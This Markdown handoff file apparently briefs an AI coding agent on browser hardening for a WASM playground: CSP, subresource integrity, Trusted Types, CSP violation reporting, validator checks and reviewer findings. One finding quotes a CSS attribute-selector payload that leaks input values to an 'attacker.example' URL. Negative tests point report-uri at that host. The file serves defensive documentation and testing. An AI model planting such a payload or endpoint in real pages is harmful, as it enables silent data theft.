# V1.16 — Agent Handoff

You are continuing the Atlas Verifiable Knowledge Graph project. **V1.16 Welle A + Welle B SHIPPED on `master`** — Welle A on 2026-05-04 (commits `0630f4e` + `245f958`), Welle B on 2026-05-05 (commit `62c9df3`, pushed to `origin/master`). Browser-runtime hardening for `apps/wasm-playground/`: strict CSP + Subresource Integrity on `app.js` + Trusted Types enforcement (Welle A); CSP violation reporting via `report-uri /csp-report` + receiver-shape spec (Welle B). 347 Rust tests still green (no Rust touched). All reviewer findings (parallel `code-reviewer` + `security-reviewer`) addressed in-commit. **V1.15 closed completely** beforehand: Welle A (const-time KID-equality invariant, commit `098b710`), Welle B (dual-channel WASM distribution + latent OIDC-permissions fix, commit `132b5aa`), Welle C (consumer reproducibility runbook, commit `640fc9a`). The user prefers **German** in chat; respond in German. Standing directive: *"Geh mit A und hol es bestmöglich aus dem Produkt raus. Entscheide du, was jetzt das Bestmögliche ist anhand deiner Informationen, die du hast. Immer beste Sicherheit und beste Codequalität."*

> ⚠️ **Read this in full before touching code.** It captures the V1.16 Welle A + B scope rationale, the design decision trees (hash-CSP vs nonce-CSP vs external-script + SRI; report-uri vs report-to), the empirical wasm-bindgen TT-compat baseline, the receiver-shape spec for CSP reporting, and what's still on the V1.16 candidate list (Welle C / Welle D candidates).

> **If you only read three things:** (1) "Session opener — start here" right below — the recommended next action; (2) §0 "Post-Welle-B status" — current state, what shipped, what's open; (3) §0's "V1.16 candidates (re-prioritized after Welle B)" list — the menu. Skip §1 (Welle A history) unless you need provenance for a specific design decision; it's preserved verbatim for audit only.

> **Doc structure:** §0 = current Welle B status + next-action menu (READ). §1 = Welle A history (audit-only). §"V1.15 sign-off" = pointer to `.handoff/v1.15-handoff.md`. §"Standing protocol" = workflow rules (re-read each session).

---

## Session opener — start here

**Working tree state (as of 2026-05-05):** clean on `master`, in sync with `origin/master`. No uncommitted changes. No stashes. 347 Rust tests passing under `--features hsm`. Validator green: `bash tools/playground-csp-check.sh` exits 0 with documented `frame-ancestors` WARN.

**Verify-before-touch checklist** (run these to confirm baseline before any Welle C edit):
- `bash tools/playground-csp-check.sh` → exit 0, `PASS`, `frame-ancestors` WARN + `report-uri: /csp-report` line.
- `/c/Users/nelso/.cargo/bin/cargo.exe test --features hsm --workspace` → 347 passing.
- `git status` → clean; `git log --oneline -6` → top is the most recent V1.16 docs/handoff commit, then `bcbd817` + `62c9df3` (Welle B), then `5c22c61` + `245f958` + `0630f4e` (Welle A docs/feat sequence).

**Recommended next action (default if user says "weiter" / "go" / "Welle C"):**

→ **V1.16 Welle C = #2 (hosting decision + deployment)**. Welle B closed F-3 at the page-bytes layer (`report-uri /csp-report` declared); Welle C is the deployment-side closure: pick a host (GitHub Pages / Cloudflare Pages / Netlify / Vercel / `playground.atlas-trust.dev` direct), pin DNS, configure HTTP-header-mode CSP so `frame-ancestors` actually takes effect AND `report-to` + `Reporting-Endpoints` are added for forward-compat, set cache headers, and stand up a minimal `/csp-report` receiver matching the documented receiver-shape spec. This unblocks #3 (WASM-binary SRI) and #4 (service-worker pinning) as follow-ups. Significant decision points: vendor lock vs self-host, whether to ship a receiver inline (Cloudflare Worker ~30 lines) or accept "no receiver yet" for soft-launch. **Load-bearing files for this Welle:** `apps/wasm-playground/index.html` (CSP meta-tag — `report-uri /csp-report` already declared); `tools/playground-csp-check.sh` (anti-drift gate — must keep passing); `docs/SECURITY-NOTES.md` §scope-d bullet 6 (search: `Receiver-shape spec` — the normative table any operator implementation MUST satisfy, including the ATTACKER-CONTROLLED callout); `docs/ARCHITECTURE.md` V1.16 boundary (trust-property bullet — extend with hosting/header outcome).

**Alternative openers (ask which if user is ambiguous):**
- **V1.16 Welle C = #6 (auto-verify CI action `@atlas-trust/verify-wasm-pin-check@v1`)** if the user wants to pivot away from the playground entirely and ship a downstream-consumer-facing increment. Pure-additive composite GitHub Action (`npm ci --ignore-scripts` + `npm audit signatures` + lockfile-integrity-format check). Lowers the consumer-side bar from "read CONSUMER-RUNBOOK + 4 lines of YAML" to "single `uses:` clause". Doesn't require any deployment decision.
- **V1.16 Welle C = #5 (multi-issuer Sigstore tracking)** if the user wants a low-effort tracking-only Welle. Pure-doc: add a "Multi-issuer Sigstore — tracking" section to `docs/CONSUMER-RUNBOOK.md` documenting the upstream `tuf-conformance` work and the criteria under which Atlas would adopt multi-issuer redundancy. No code change.
- **Skip ahead to V1.17** if the user thinks V1.16 is closed at Welle B. Reasonable position: F-3 (the only HIGH residual from Welle A) is now closed at the page-bytes layer; remaining V1.16 candidates are MEDIUM/LOW. V1.17 would open the next major scope (likely tag-signing #9 or const-time `BTreeMap` #10 or COSE migration prep).

**Workflow reminder:** implement → parallel `code-reviewer` + `security-reviewer` → fix CRITICAL/HIGH/selected MEDIUMs in-commit → single `feat(v1.16/welle-c)` commit + `docs(v1.16/handoff)` commit prepending a Post-Welle-C status block above §0 in this file (renumber existing blocks downward) → push to `origin/master`. The pure-bash `tools/playground-csp-check.sh` is the V1.16 anti-drift gate; run after any `apps/wasm-playground/*` edit. Cargo PATH on Windows is non-default — the repo is a Windows host with bash, so all shell snippets here use MSYS forward-slash paths. Full WASM rebuild: `/c/Users/nelso/.cargo/bin/wasm-pack.exe build crates/atlas-verify-wasm --target web --release --out-dir ../../apps/wasm-playground/pkg`.

**Before you touch anything**, confirm scope with the user in one sentence, then proceed under the standing directive.

---

## 0. Post-Welle-B status (2026-05-05) — V1.16 Welle B SHIPPED (current)

**Shipped:** commit `62c9df3` `feat(v1.16/welle-b): CSP violation reporting — report-uri /csp-report (page-bytes only)`.

- `apps/wasm-playground/index.html` — CSP meta-tag now declares `report-uri /csp-report` (appended to the existing directive list). New per-directive comment block (~30 lines) inside the existing CSP comment documents the rationale for `report-uri` over `report-to` (meta-tag delivery is incompatible with the Reporting API's required `Reporting-Endpoints` HTTP header), the same-origin choice, the no-receiver-deployed degradation behaviour (browsers POST to a 404, violation still BLOCKED, only the report is lost), and the cross-reference to scope-d for the receiver-shape spec.
- `tools/playground-csp-check.sh` — new validation block: asserts `report-uri` is declared (hard fail if missing), checks the URL shape with three WARN cases distinguished — protocol-relative `//attacker/path` (browsers treat as absolute, third-party host), fully-qualified cross-origin URL (opaque-response loss + vendor-disclosure cost — both costs explicitly named), and bare relative path (fragile under nested-path serving). Same-origin absolute path is the silent-pass desired shape. Header doc-comment updated to mention check #5. `mktemp` for `--update-sri` now lives in the same directory as `INDEX_HTML` so the final `mv` is atomic on the same filesystem (closes a TOCTOU window if `$TMPDIR` is on a shared/world-writable mount). `REPORT_URI_FIRST` now defensively initialised at declaration site to avoid an `unbound-variable` trap if the guard condition is later refactored.
- `docs/SECURITY-NOTES.md` §scope-d (search: `scope-d — Browser-runtime hardening`) — heading retitled to "Welle A + Welle B"; new bullet 6 covering the receiver-shape spec with full JSON example, deployment-options enumeration (self-hosted minimal collector, third-party reporting service, no receiver), and the report-uri-vs-report-to rationale + graceful-degradation framing + F-3-closure framing ("receiver-ready" not "visibility achieved"). Receiver-shape spec is a normative table fronted by an **ATTACKER-CONTROLLED callout** (final-pass review hardening: ALL fields are attacker-chosen, not just `blocked-uri`/`script-sample`; ANSI-escape injection on terminal-rendered logs is an explicit secondary failure mode). Table covers: ATTACKER-CONTROLLED reminder (first row), `Origin`-header server-side validation (CSRF-style anchor independent of trusting body fields), Content-Type allow-list (`application/csp-report` OR `application/json` — Firefox historically), body-size cap (≤ 64 KB), schema validation against deployed CSP, document-uri origin check, per-IP rate limit, append-only log (post ANSI-strip), `204 No Content` with EMPTY body and NO custom response headers (closes response-header reflection), no per-sink reflection without escape, document-uri query-string + fragment handling. "What scope-d does NOT cover" updated: `report-to`/`Reporting-Endpoints` HTTP header config (operator responsibility), receiver implementation (operator responsibility), report-spoofing protection (receiver-side mitigation, partially addressed by `Origin` row above). Trust composition table (search: `Trust composition table`) extended with V1.16 Welle B row (post-block visibility into CSP violations) — pinning *visibility*, not a new attack surface.
- `docs/ARCHITECTURE.md` V1.16 boundary — heading retitled to "Welle A + Welle B"; new bullet for `report-uri /csp-report` covering page-bytes-only constraint, same-origin choice, why report-uri over report-to (meta-tag-delivery forced); trust-property bullet reworded from "buys post-block visibility" to "receiver-ready post-block visibility" with explicit operator-responsibility note (reviewer M6 fix).
- `apps/wasm-playground/README.md` — new "CSP violation reporting (V1.16 Welle B)" section + Content-Type completeness fix (added `application/json` Firefox variant + "receivers MUST accept both" note). Maintenance workflow updated to mention the new `report-uri` validator check.
- `README.md` — banner extended with V1.16 Welle B summary; V-timeline narrative paragraph extended with the report-uri rationale + receiver-shape pointer.

**Design decision tree (key tradeoffs):**
- **`report-uri` (CSP3-deprecated) vs `report-to` (modern Reporting API):** chose report-uri. The Reporting API requires a `Reporting-Endpoints` HTTP header to declare endpoint groups, which CANNOT be sent via `<meta http-equiv>`. Page-bytes-only constraint forces report-uri. All four major browsers (Chrome, Firefox, Safari, Edge) honour report-uri as of 2026; Chrome's removal intent was withdrawn. Header-mode-CSP deployments SHOULD declare BOTH for forward-compat — documented as operator responsibility.
- **Hardcoded `/csp-report` placeholder vs configurable endpoint:** chose hardcoded placeholder. Page-bytes-only means no build-time substitution; the only escape hatch is HTTP-header-mode CSP override at the hosting layer (which keeps page bytes deployment-agnostic). Path collision risk is low (`/csp-report` is not a well-known path / framework default).
- **Validator hard-fail vs WARN on cross-origin endpoint:** chose WARN. Cross-origin report-uri is technically allowed by spec; failing CI on it would prevent operators from using third-party reporting services (Sentry / report-uri.com / Datadog). WARN names both costs (opaque-response field loss + vendor disclosure via world-readable HTML source).
- **No-receiver-deployed default behaviour:** chose to allow it (browser POSTs to 404 → violation still blocked, only report lost). Keeps the page bytes useful for local-dev (`npx serve` with no receiver) without the policy coupling that a hard-required receiver would create. Documented as "acceptable for local-dev only; not acceptable for hosted production."
- **Receiver-shape spec strength:** chose to be opinionated. The spec is a normative-style table (RFC-like "MUST"/"MUST NOT") rather than suggestions, because the most likely failure mode is a naive operator implementing a receiver that becomes a downstream attack surface (stored XSS in monitoring UI from attacker-controlled `blocked-uri`/`script-sample`). The HIGH-severity finding from security-reviewer was exactly this — fix landed in-commit.

**Reviewer findings classified (parallel `code-reviewer` + `security-reviewer`, single pass):**
- HIGH (sec): `blocked-uri`/`script-sample` are attacker-controlled but receiver-shape spec did not flag them for sanitisation → added explicit ATTACKER-CONTROLLED row to receiver-shape table with naive-log-UI XSS warning. Addressed in-commit.
- MEDIUM M2 (code): protocol-relative URL `//attacker/path` escaped same-origin case-arm in validator → added explicit `//*)` arm with WARN. Addressed in-commit.
- MEDIUM (sec): receiver-shape spec missing Content-Type allow-list / body-size cap / document-uri origin check / response-header reflection warning → all four added to receiver-shape table. Addressed in-commit.
- MEDIUM (sec): cross-origin WARN message did not name vendor-disclosure cost → expanded to enumerate both opaque-response field loss AND public CSP exposure of operator's monitoring vendor. Addressed in-commit.
- MEDIUM M6 (sec): ARCHITECTURE.md "buys post-block visibility" overstated what's delivered without a receiver → reworded to "receiver-ready post-block visibility" with explicit operator-responsibility note. Addressed in-commit.
- LOW L1 (code): `REPORT_URI_FIRST` unbound-variable trap if guard refactored → defensive empty-init at declaration site. Addressed in-commit.
- LOW L2 (code): playground README missed `application/json` Content-Type variant (Firefox historically) → added "receivers MUST accept both" note. Addressed in-commit.
- LOW L4 (sec): `mktemp` TOCTOU race in `--update-sri` (TMPDIR could be shared filesystem) → mktemp now in same directory as `INDEX_HTML` so the final `mv` is atomic on the same filesystem. Addressed in-commit.
- LOW (sec): graceful-degradation if browsers ever remove `report-uri` undocumented → added paragraph noting failure mode is silent loss of reports (CSP enforcement unaffected). Addressed in-commit.
- LOW (sec): `/csp-report` path collision risk — no action required; escape hatch documented (HTTP-header CSP override at hosting layer).
- LOW (sec): No body-size cap in receiver-shape spec → addressed inside the "MEDIUM (sec)" receiver-shape table extension above.
- LOW M1 (code): `csp_has` multi-token regex theoretically fragile but works on actual CSP string today → deferred. Documented as a hardening candidate for V1.17 if a CSP-format change is ever proposed.
- LOW L3 (code): README banner length unwieldy → deferred (stylistic only).
- Final state: PASS. No CRITICAL/HIGH residual.

**Final-pass review (full re-review before next-session handoff, 2026-05-05):**
Ran code-reviewer + security-reviewer + handoff-doc-reviewer in parallel after the Welle B feat+docs commits landed. Three more findings actioned in a separate `fix(v1.16/welle-b)` commit:
- MEDIUM (code): scheme `case` arms in validator were case-sensitive, so `HTTP://` / `Https://` slipped through to the catch-all WARN. RFC 3986 §3.1 specifies schemes as case-insensitive. Fix: lowercase coercion before dispatch (`tr '[:upper:]' '[:lower:]'` into `REPORT_URI_FIRST_LC`).
- MEDIUM (sec): catch-all relative-path arm was a WARN but check-5's intent is "absolute same-origin" — relative paths resolve against the document URL and break under nested-path serving. Tightened to a hard FAIL. The current `/csp-report` is absolute so this is forward-protection, not a regression.
- MEDIUM (sec): receiver-shape ATTACKER-CONTROLLED warning was buried as the LAST row in a 9-row table. Promoted to a bold callout BEFORE the table. Expanded coverage from `blocked-uri`/`script-sample` to ALL report fields (including `document-uri` query/fragment, `referrer`). Added ANSI-escape-injection-on-terminal-logs as an explicit secondary failure mode. Added new rows: `Origin`-header server-side validation (CSRF-style anchor independent of trusting body fields, partially closes report-spoofing case), `204 No Content` with EMPTY body and NO custom response headers (closes response-header reflection sink). Updated "respond" row to be unambiguous about empty body + only `Content-Length: 0`.
- LOW (code): claimed `\csp-report` backslash typo — verified by grep, FALSE POSITIVE. No fix needed.
- LOW (sec): handoff doc had duplicate `## 0.` heading (both Welle A and Welle B status blocks). Renumbered Welle A → `## 1.` with explicit "history — superseded by §0" suffix.
- LOW (doc): handoff missing fresh-agent affordances → added "If you only read three things" stratification, "Doc structure" line, "Verify-before-touch checklist" with concrete commands, named load-bearing files in opener, MSYS forward-slash convention note + full WASM rebuild command.
- LOW (doc): §1 (Welle A history block) carried a stale 11-item V1.16 candidates list that duplicated §0's re-prioritised version → collapsed to a single SUPERSEDED-BY-§0 pointer with git-show command for full audit access.
- Deferred: validator multi-URI silent acceptance edge (V1.17 candidate alongside `csp_has` deferral).
- Final-pass state: PASS. Validator green, no CRITICAL/HIGH residual, doc structurally clean for fresh-context-window handoff.

**Verifications run:**
- `bash tools/playground-csp-check.sh`: PASS, exit 0, with `frame-ancestors` WARN + `report-uri: /csp-report` line.
- Negative test (report-uri removed from CSP): FAIL with explanatory error.
- Negative test (`//attacker.example/csp`): PASS with new schemeless-URL WARN.
- Negative test (`https://attacker.example/csp`): PASS with expanded cross-origin WARN naming both costs (opaque-response + vendor-disclosure).
- `--update-sri` path still works after mktemp same-dir fix.
- No Rust touched — `cargo test` count stays at 347.

**V1.16 candidates (re-prioritized after Welle B):**

1. ~~CSP violation reporting endpoint~~ — **CLOSED at page-bytes layer in Welle B.** Deployment-side closure (running an actual receiver) is now part of #2.
2. **Hosting decision + deployment** (MEDIUM — predicate for Welle B fully effective). Now elevated to #1 priority. Decide where the playground lives publicly, configure HTTP-header-mode CSP (`frame-ancestors`, `Reporting-Endpoints` for `report-to`), set cache headers, stand up a `/csp-report` receiver matching the documented spec. Welle C candidate.
3. **WASM-binary SRI** (LOW — Welle A residual). Wait-for-spec or path-b custom fetch. Defer until #2 lands.
4. **Service-worker pinning** (LOW — composes with #2). Out of scope until hosting decision.
5. **Multi-issuer Sigstore redundancy** (MEDIUM — V1.15 residual). Track upstream + adopt when stack supports it. Could be a pure-doc Welle (tracking-only).
6. **Auto-verify CI action for downstream consumers** (MEDIUM — V1.15 residual). `@atlas-trust/verify-wasm-pin-check@v1`. Pure-additive composite GitHub Action.
7. **Two-job split for `wasm-publish.yml`** (LOW — V1.15 Welle B residual).
8. **Backup-channel registry-API equivalence** (LOW — V1.15 Welle B residual).
9. **Tag-signing enforcement** (MEDIUM — V1.15 residual, V1.17 candidate).
10. **Const-time policy expansion to `BTreeMap`/`BTreeSet`** (LOW — V1.15 Welle A residual, V1.17 candidate).
11. **CSS-injection sink-discipline** (LOW — Welle A residual F-6).

For the V1.16 next-session opener: see "Session opener — start here" at top of file. Default split: **Welle C = #2 (hosting decision + deployment + receiver)** unlocks #3/#4. Pivot to #6 (auto-verify CI action) or #5 (multi-issuer Sigstore tracking) if the user wants a non-playground V1.16 scope; or close V1.16 at Welle B and open V1.17 if hosting is going to be deferred indefinitely.

---

## 1. Post-Welle-A status (2026-05-04) — V1.16 Welle A SHIPPED (history — superseded by §0 for current state)

**Shipped:** commit `feat(v1.16/welle-a): browser-runtime hardening — strict CSP + SRI + Trusted Types on apps/wasm-playground/`.

- `apps/wasm-playground/index.html` (modified, ~280 lines) — strict CSP via `<meta http-equiv="Content-Security-Policy">` with per-directive comments documenting *why* each token is what it is. Directives: `default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'none'; frame-ancestors 'none'; base-uri 'none'; require-trusted-types-for 'script'; trusted-types 'none'`. Plus `<meta http-equiv="X-Content-Type-Options" content="nosniff">` and `<meta name="referrer" content="no-referrer">`. Inline `<script type="module">` extracted to sibling `app.js`; loading tag is `<script type="module" src="app.js" integrity="sha384-x2GpUe9H7Srr1SXZCDK4QJ41ookQHgQk3yKTawCzfPMZ6eHEPjYGEm8GG9v+1icq" crossorigin="anonymous">`. New footer line `<strong>Loaded verifier:</strong> <code id="verifier-version">…</code>` surfaces the WASM-side version string in the UI (replaces the F-5 console.log violation; auditors don't need devtools).
- `apps/wasm-playground/app.js` (NEW, ~115 lines) — application code extracted from inline. Header comment block (lines 1-19) documents sink discipline (textContent / className / style.display only). Loads the WASM module via dynamic `import('./pkg/atlas_verify_wasm.js')`, surfaces a friendly catch-block error if `pkg/` is missing, writes the loaded verifier version into `#verifier-version` in the footer. NO `console.log` anywhere; NO `innerHTML` / `document.write` / `eval` / `new Function` / `setTimeout(string)`.
- `tools/playground-csp-check.sh` (NEW, pure-bash validator) — CI mode (no flags) asserts: every required CSP directive present, no `'unsafe-inline'` regression on `script-src`, no `'unsafe-eval'` regression (only `'wasm-unsafe-eval'` keyword permitted), SRI hash on `<script src="app.js">` matches the actual sha384 of `app.js`, `crossorigin="anonymous"` present, wasm-bindgen-emitted glue at `apps/wasm-playground/pkg/atlas_verify_wasm.js` is TT-protected-sink-free (when `pkg/` exists). Also emits a WARN on `frame-ancestors 'none'` (meta-tag-ignored by all major browsers) so CI green doesn't lull operators into thinking clickjacking is mitigated without an HTTP-header-mode CSP. `--update-sri` flag re-pins the hash after a legitimate `app.js` edit; pre-flight `grep` refuses to "update" a tag that has no existing `integrity=` attribute (closes silent-no-op false-positive PASS).
- `apps/wasm-playground/README.md` — added "Browser-runtime hardening (V1.16 Welle A)" section + maintenance workflow describing the `--update-sri` step.
- `docs/SECURITY-NOTES.md` — V1.15→V1.16 header. New `## scope-d — Browser-runtime hardening of the WASM playground (V1.16 Welle A — shipped)` section before "Crate boundary". Five sub-sections: trust property (no new property — defence-in-depth on UI delivery), what scope-d covers (CSP + SRI + nosniff/referrer + validator + wasm-bindgen TT-compat baseline), what scope-d does NOT cover (CSP reporting, CSS exfil, WASM-binary SRI, service-worker pinning, JS-side input cap, server-side header, hosting/DNS), Anti-drift (validator + sink-discipline file headers + SRI foot-gun mitigation with example pre-commit hook), Trust composition table including V1.16 scope-d row.
- `docs/ARCHITECTURE.md` — V1.15→V1.16 header. New `### V1.16 — Browser-runtime hardening of the WASM playground (shipped: Welle A)` boundary block before V2.
- `README.md` — Status banner updated with V1.16 Welle A summary; V-timeline narrative extended with the V1.16 paragraph naming CSP/SRI/TT/validator and the load-bearing wasm-bindgen 0.2.118 audit.

**Design decision tree (key tradeoffs):**
- **Hash-CSP vs nonce-CSP vs external-script + SRI:** chose external-script + SRI. Hash-CSP requires a build step to compute and inject the script hash on every edit (poor fit for static-hosting); nonce-CSP requires the hosting provider to mint a per-request nonce (forces server-side rendering); external-script + SRI works against any plain static host (`npx serve`, `python3 -m http.server`, S3, GitHub Pages, Cloudflare Pages, Netlify) with the hash maintained by `tools/playground-csp-check.sh --update-sri`.
- **`<meta http-equiv>` CSP delivery vs HTTP header:** chose meta-tag for the page-bytes-portability win; documented `frame-ancestors` is browser-ignored via meta-tag (header-only), and the validator emits a WARN to remind operators that clickjacking protection still needs a real header at deploy time. Defence-in-depth either way: a correctly-configured host SHOULD also send the same policy as a header.
- **`'wasm-unsafe-eval'` vs `'unsafe-eval'`:** `'wasm-unsafe-eval'` is the dedicated CSP3 keyword for `WebAssembly.compile`/`instantiate` and does NOT enable JavaScript `eval()`/`new Function()`. Hardening win without the JS-eval cost.
- **Strict TT (`require-trusted-types-for 'script' + trusted-types 'none'`) vs default-policy:** chose strict (no policy can be created). The application is sink-free by construction (textContent / className / style.display only), so the strictest setting is the load-bearing one — any future regression that re-introduces a sink fails at the browser boundary, not at code-review time. This required confirming wasm-bindgen-emitted glue is also TT-compatible (see below).
- **wasm-bindgen TT-compatibility:** `pkg/atlas_verify_wasm.js` is gitignored, so the audit can't be a static file check. Solved by (a) building once at audit time (`wasm-pack build crates/atlas-verify-wasm --target web --release --out-dir ../../apps/wasm-playground/pkg`), (b) auditing the emitted glue for TT-protected sinks (eval / new Function / innerHTML / outerHTML / document.write / insertAdjacentHTML / setTimeout(string) / setInterval(string) / *.text =), (c) confirming clean at wasm-bindgen 0.2.118, (d) codifying the audit as part of the validator (`PKG_GLUE` check runs whenever `pkg/` is present). Future wasm-bindgen upgrades MUST re-run the validator to confirm continued TT-compat.

**Reviewer findings classified (parallel `code-reviewer` + `security-reviewer`, two passes):**
- HIGH F-1 (security): wasm-bindgen-emitted glue TT-compatibility unverified at handoff time. `pkg/` is gitignored so the audit could not be done from the static repo state. Fix: built WASM, audited 315 lines of emitted glue, confirmed sink-free at wasm-bindgen 0.2.118; codified the audit as a `PKG_GLUE` check inside `tools/playground-csp-check.sh` so future builds don't regress silently; documented the empirical baseline in `SECURITY-NOTES.md` scope-d bullet 5. Addressed in-commit.
- MEDIUM M2 (code): `--update-sri` `awk sub()` was a silent no-op if no `integrity=` attribute existed on the target tag, leading to a false-positive PASS in CI ("nothing to update — green"). Fix: pre-flight `grep` check that fails with an explanatory error before the awk pass, plus post-flight verification that the new `integrity=` is actually present. Addressed in-commit.
- MEDIUM F-2 (security): validator was silently passing on `frame-ancestors 'none'` declared in meta-tag, but all major browsers ignore that directive when meta-delivered. Fix: validator emits a WARN reminding the operator that clickjacking protection requires the hosting provider to ALSO send the policy as an HTTP header. Documented the same in scope-d "What scope-d does NOT cover" + ARCHITECTURE.md V1.16 boundary. Addressed in-commit.
- MEDIUM F-3 (security): no CSP-reporting endpoint configured (`report-uri` / `report-to` / `Reporting-Endpoints`), so production CSP violations would be silent. Fix: explicit "CSP violation reporting" entry added to scope-d "What scope-d does NOT cover" with a Welle B / V1.17 candidate pointer. (Not implemented in Welle A because `report-to` requires either a server endpoint or a third-party reporting service — both are deployment-time decisions, not page-bytes decisions.) Addressed in-commit.
- MEDIUM F-4 (security): SRI foot-gun — editing `app.js` without re-running `--update-sri` produces a silent edit-time failure (and a fail-loud runtime failure on the next browser visit), but a pre-commit hook closes the gap. Fix: added "SRI foot-gun mitigation" subsection to Anti-drift in scope-d with an example bash fragment for `.git/hooks/pre-commit`. Not enforced project-wide (rare edit path; CI on push is the second backstop). Addressed in-commit.
- LOW F-5 (code): `console.log('Atlas verifier loaded, version:', mod.verifier_version())` at `app.js:53` violated the project rule (typescript/coding-style.md "No console.log statements in production code"). Pre-existing from the inline-`<script>` version but inherited into `app.js`. Fix: replaced with `versionEl.textContent = mod.verifier_version();` writing to a new `<code id="verifier-version">` element in the footer. Auditors now see the loaded version without devtools, project rule honoured. Required SRI re-pin (sha384-x2Gp…). Addressed in-commit.
- LOW F-6 (security): CSS data exfiltration via attribute selectors — `style-src 'self' 'unsafe-inline'` allows an attacker who manages to inject CSS to leak `<input>` value attributes via `input[value^="abc"] { background-image: url(//attacker.example/exfil); }`. The current playground has no `<input type="text">` with sensitive values (only file pickers, which don't expose `value`), so practical residual is zero. Fix: documented as an explicit gap in scope-d "What scope-d does NOT cover" so a future maintainer adding text-input fields knows to re-evaluate `style-src`. Addressed in-commit.
- Final state: PASS. Code-reviewer verdict "PASS with recommended fixes before commit"; security-reviewer verdict "CONDITIONAL PASS" upgraded to PASS after F-1 empirical resolution.

**Verifications run:**
- `bash tools/playground-csp-check.sh` (CI mode): exit 0, "PASS" with the WARN on `frame-ancestors`. Final SRI hash: `sha384-x2GpUe9H7Srr1SXZCDK4QJ41ookQHgQk3yKTawCzfPMZ6eHEPjYGEm8GG9v+1icq`.
- `wasm-pack build crates/atlas-verify-wasm --target web --release --out-dir ../../apps/wasm-playground/pkg`: clean build; emitted `pkg/atlas_verify_wasm.js` (315 lines) audited TT-sink-free.
- No Rust touched in Welle A — `cargo test` count stays at 347 from V1.15 baseline; no re-run needed.
- Negative validator tests (drift in app.js, drift in CSP directive, missing `crossorigin`, missing `integrity` on `--update-sri`) all fail loud as designed; positive case is the live validator output above.
- Cross-link sweep: README → wasm-playground/README ✓, ARCHITECTURE V1.16 boundary → SECURITY-NOTES scope-d ✓, SECURITY-NOTES scope-d → ARCHITECTURE V1.16 ✓, wasm-playground/README → tools/playground-csp-check.sh ✓.

**V1.16 candidates (as of Welle A close):** SUPERSEDED by §0's re-prioritised list (lines 70-84 of this file). Welle A's #1 (CSP reporting) shipped as Welle B; #2 (hosting + deployment + receiver) is now the Welle C default. The full Welle-A-era candidates list with rationale is preserved in this file's git history (git show `245f958`:.handoff/v1.16-handoff.md) for audit; do not consult it for current planning.

---

## V1.15 sign-off (2026-05-04, for cross-reference)

V1.15 closed completely on `master`:
- Welle A (commit `098b710`) — const-time KID-equality invariant + 5-test source-level anti-drift audit.
- Welle B (commit `132b5aa`) — dual-channel WASM distribution via GitHub Releases backup + latent V1.14 Scope E `id-token: write` step-level placement bug fixed (workflow-level now).
- Welle C (commit `640fc9a`) — consumer reproducibility runbook (`docs/CONSUMER-RUNBOOK.md`).
- All three pushed to `origin/master`. 347 Rust tests passing under `--features hsm`.

Full V1.15 detail lives in `.handoff/v1.15-handoff.md` §0 (post-Welle-A / -B / -C status blocks). Treat that file as the canonical V1.15 record; this file (`.handoff/v1.16-handoff.md`) is the canonical V1.16 record going forward.

---

## Standing protocol (re-stated for the next session)

- **Workflow:** implement → parallel `code-reviewer` + `security-reviewer` → fix CRITICAL/HIGH/selected MEDIUMs in-commit → single `feat(v1.16/welle-X)` commit + `docs(v1.16/handoff)` commit → push to `origin/master`.
- **Tests:** Rust workspace at 347 passing under `--features hsm`. WASM builds via `/c/Users/nelso/.cargo/bin/wasm-pack.exe` (Cargo PATH on Windows is non-default; remember the `/c/Users/nelso/.cargo/bin` prefix). The pure-bash playground validator is the new V1.16 anti-drift gate; run it after any `apps/wasm-playground/*` edit.
- **Chat language:** German.
- **Decision authority:** the standing directive grants autonomy on design choices when "Geh mit A" is invoked; for any pivot away from Welle B/C/D candidates listed above, reconfirm with the user before starting.
- **Trust property reasoning:** every new scope (V1.16+) MUST be classified in the scope-d-style trust composition table (what does it pin? what failure mode does it address? what does it NOT cover?). The composition table in `docs/SECURITY-NOTES.md` is the load-bearing document; keep it accurate as new layers ship.

---
